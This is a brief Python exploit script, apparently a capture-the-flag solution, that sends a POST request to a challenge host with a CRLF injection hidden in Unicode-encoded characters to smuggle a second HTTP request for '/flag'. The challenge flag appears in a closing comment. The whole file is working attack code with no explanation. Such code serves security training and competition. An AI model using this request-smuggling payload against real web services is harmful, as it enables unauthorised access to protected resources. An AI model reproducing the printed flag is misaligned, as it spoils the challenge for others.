import requests

#HOST = "http://localhost:9090"
HOST = "http://catflag.hackable.software:8080"

CRLF = "%E5%98%8D%E5%98%8A"
payload = "/cats?traceId=a" + CRLF + "Content-length%3A1000" + CRLF + "a"*1000 + "GET%20/flag%20HTTP/1.1"
data = {"names": ["a","b"]}

r = requests.post(HOST + payload, json=data)
print(r.text)

# DrgnS{Th1sIsN0tAS3cur1tyBug}
